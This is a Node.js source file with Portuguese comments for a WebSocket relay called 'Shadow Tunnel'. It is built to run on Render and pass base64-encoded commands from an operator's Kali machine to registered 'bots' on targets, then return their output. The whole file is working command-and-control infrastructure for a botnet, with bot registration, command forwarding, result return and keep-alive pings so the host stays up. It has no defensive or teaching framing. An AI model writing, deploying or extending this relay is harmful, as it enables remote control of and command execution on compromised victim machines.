// ---------- SHADOW-TUNNEL RELAY v9.2 ---------- //
// Servidor WebSocket que vive no Render: faz ponte entre Kali e alvos
// NÃO precisa de package.json extra – Render já possui ws instalado globalmente

const WebSocket = require('ws');
const http      = require('http');

const server = http.createServer((_,r)=>r.end('Shadow Tunnel Gateway Active'));
const wss    = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();        // id → websocket

wss.on('connection', (ws, req)=>{
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    if(!id) return ws.close();

    if(id === 'KALI'){
        KALI = ws;
        console.log('[+] Kali conectado');
        BOTS.forEach((_,botId)=> KALI.send(JSON.stringify({t:'bot',s:'on',id:botId})) );
    }else{
        BOTS.set(id, ws);
        console.log(`[+] Bot ${id} registrado`);
        if(KALI?.readyState === WebSocket.OPEN)
            KALI.send(JSON.stringify({t:'bot',s:'on',id}));
    }

    ws.on('message', raw=>{
        if(ws === KALI){                     // Kali → alvo
            try{
                const {to,cmd} = JSON.parse(raw);   // cmd já vem em base64
                const target = BOTS.get(to);
                if(target?.readyState === WebSocket.OPEN) target.send(cmd);
            }catch{}
        }else{                                // alvo → Kali
            if(KALI?.readyState === WebSocket.OPEN)
                KALI.send(JSON.stringify({t:'res', f:id, d:raw.toString()}));
        }
    });

    ws.on('close',()=>{
        if(ws === KALI){ KALI=null; console.log('[-] Kali off'); }
        else{
            BOTS.delete(id);
            if(KALI?.readyState === WebSocket.OPEN)
                KALI.send(JSON.stringify({t:'bot',s:'off',id}));
        }
    });

    // Keep-alive para o Render não derrubar
    const ping = setInterval(()=>(ws.readyState===WebSocket.OPEN?ws.ping():clearInterval(ping)), 25000);
});

server.listen(process.env.PORT||10000);
